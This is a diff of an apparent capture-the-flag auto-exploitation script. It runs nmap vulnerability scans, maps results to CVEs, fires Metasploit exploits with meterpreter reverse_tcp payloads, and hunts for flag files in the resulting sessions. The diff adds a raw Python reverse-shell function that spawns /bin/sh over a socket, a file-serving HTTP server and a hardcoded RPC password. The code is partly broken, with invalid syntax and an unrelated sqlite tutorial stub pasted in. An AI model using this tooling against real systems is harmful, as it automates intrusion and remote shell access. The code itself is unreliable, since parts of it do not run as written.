@@ -8,6 +8,10 @@ import pyperclip
 import pymetasploit3
 from pymetasploit3 import *
 from pymetasploit3.msfrpc import MsfRpcClient
+import SimpleHTTPServer
+import SocketServer
+import sys,socket,pty
+import sqlite3
 
 parser = argparse.ArgumentParser(description='What box do you want to pwn?')
 parser.add_argument('--box', required=True)
@@ -105,11 +109,10 @@ def searchExploits(cveList):
 
 def runNmap():
     nm = nmap.PortScanner()
-    nm.scan(hosts=getBoxIP(name), arguments='-sC -sV -Pn')
-    nm.scan(hosts=getBoxIP(name), arguments='--script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sC -sV -Pn')
+    nm.scan(hosts=getBoxIP(name), arguments='--script vuln,nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -oN ' + name.box + '.nmap -sC -sV -Pn')
     print(nm.csv())
     print(nm.command_line())
-    with open('nmapOutput.csv', 'w') as f:
+    with open(name.box + '_nmapOutput.csv', 'w') as f:
        print(nm.csv(), file=f)
     # with open('nmapOutput.csv', 'w', newline='') as file:
     #     writer = csv.writer(file)
@@ -132,9 +135,42 @@ def cleanTemporaryFiles():
     if os.path.exists(filePath):
         os.remove(filePath)
 
+def HTTPServer():
+    PORT = 8000
+    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+    httpd = SocketServer.TCPServer(("", PORT), Handler)
+    print "serving at port", PORT
+    httpd.serve_forever()
+
+def reverseShell():
+    RHOST = name.box
+    RPORT = 4242
+    s=socket.socket()
+    s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+    os.dup2(s.fileno(),fd) for fd in (0,1,2)
+    pty.spawn("/bin/sh")'
+
+def exploitsDB():
+    conn = sqlite3.connect('example.db')
+    c = conn.cursor()
+
+    # Create table
+    c.execute('''CREATE TABLE stocks
+                 (date text, trans text, symbol text, qty real, price real)''')
+
+    # Insert a row of data
+    c.execute("INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)")
+
+    # Save (commit) the changes
+    conn.commit()
+
+    # We can also close the connection if we are done with it.
+    # Just be sure any changes have been committed or they will be lost.
+    conn.close()
+
 def windowsWorkflow():
     #Clean temporary files
-    cleanTemporaryFiles()
+    #cleanTemporaryFiles()
     #Run nmap on machine
     runNmap()
     #Get CVEs
@@ -145,7 +181,7 @@ def windowsWorkflow():
     exploitList = searchExploits(cveList)
     print(exploitList)
     # Initialize msfconsole
-    client = MsfRpcClient('NbxGWyuV', port=55552)
+    client = MsfRpcClient('1337hax0r', port=55552)
     #Search for exploits in msfconsole
     for cve in cveList:
         os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
@@ -154,11 +190,12 @@ def windowsWorkflow():
     exploitList = getExploitsFromMsf()
     for exploit in exploitList:
         x = exploit.split("/")
-        exploitType = x[0]
+        if x[0] != "auxiliary":
+            exploitType = x[0]
         exploitName = exploit.replace(exploitType + "/", "")
         #Select exploit
         exploit = client.modules.use(exploitType, exploitName)
-        #Set targetx
+        #Set target
         try:
             exploit['RHOSTS'] = getBoxIP(name)
         except KeyError:
@@ -184,51 +221,54 @@ def windowsWorkflow():
 
 def linuxWorkflow():
     #Clean temporary files
-    cleanTemporaryFiles()
+    # cleanTemporaryFiles()
     #Run nmap on machine
-    runNmap()
+    # runNmap()
     #Get CVEs
     cveList = getCVEsFromNmap()
     cveList = list(dict.fromkeys(cveList))
     print(cveList)
     #Search for exploits using searchsploit
-    exploitList = searchExploits(cveList)
-    print(exploitList)
+    # exploitList = searchExploits(cveList)
+    # print(exploitList)
     # Initialize msfconsole
-    client = MsfRpcClient('NbxGWyuV', port=55552)
+    client = MsfRpcClient('1337hax0r', port=55552)
     #Search for exploits in msfconsole
-    for cve in cveList:
-        os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
-        time.sleep(15)
+    # for cve in cveList:
+    #     os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
+    #     time.sleep(10)
     #Extract them from file
     exploitList = getExploitsFromMsf()
     for exploit in exploitList:
         x = exploit.split("/")
-        exploitType = x[0]
+        print(x)
+        if x[0] != "auxiliary":
+            exploitType = x[0]
         exploitName = exploit.replace(exploitType + "/", "")
+        print(exploitName)
         #Select exploit
-        exploit = client.modules.use(exploitType, exploitName)
-        #Set targetx
-        try:
-            exploit['RHOSTS'] = getBoxIP(name)
-        except KeyError:
-            exploit['RHOST'] = getBoxIP(name)
-        #Choose payload to use
-        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-        #Set our IP
-        payload['LHOST'] = 'tun0'
-        #Run the exploit
-        print("a")
-        exploit.execute(payload=payload)
-        time.sleep(20)
-    print(client.sessions.list)
-    #Interact with the newly opened session
-    shell = client.sessions.session(list(client.sessions.list.keys())[0])
-    shell.write('getuid')
-    shell.read()
-    print(shell.run_with_output('pwd'))
-    print(shell.run_with_output('search -f user.txt'))
-    print(shell.run_with_output('search -f root.txt'))
+    #     exploit = client.modules.use(exploitType, exploitName)
+    #     #Set targetx
+    #     try:
+    #         exploit['RHOSTS'] = getBoxIP(name)
+    #     except KeyError:
+    #         exploit['RHOST'] = getBoxIP(name)
+    #     #Choose payload to use
+    #     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+    #     #Set our IP
+    #     payload['LHOST'] = 'tun0'
+    #     #Run the exploit
+    #     print("a")
+    #     exploit.execute(payload=payload)
+    #     time.sleep(20)
+    # print(client.sessions.list)
+    # #Interact with the newly opened session
+    # shell = client.sessions.session(list(client.sessions.list.keys())[0])
+    # shell.write('whoami')
+    # shell.read()
+    # print(shell.run_with_output('pwd'))
+    # print(shell.run_with_output('search -f user.txt'))
+    # print(shell.run_with_output('search -f root.txt'))
     #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
     #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))
 
